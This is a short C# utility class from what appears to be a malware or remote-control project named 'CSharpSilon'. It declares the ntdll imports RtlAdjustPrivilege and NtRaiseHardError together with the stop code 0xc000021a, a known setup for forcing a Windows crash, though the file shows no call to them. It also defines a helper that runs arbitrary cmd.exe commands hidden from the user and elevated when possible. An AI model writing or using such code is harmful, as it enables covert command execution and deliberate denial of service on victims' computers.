using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

namespace CSharpSilon.Utils
{
    public class App
    {
        
        public static uint stopCode = 0xc000021a;
        
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        
        
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
        
        
        public static Process execute(string cmd) => Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/C {cmd}",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            Verb = IsAdmin() ? "runas" : ""
        });
        
        public static void OpenLink(string link)
        {
            execute($"start {link}");
        }
    }
}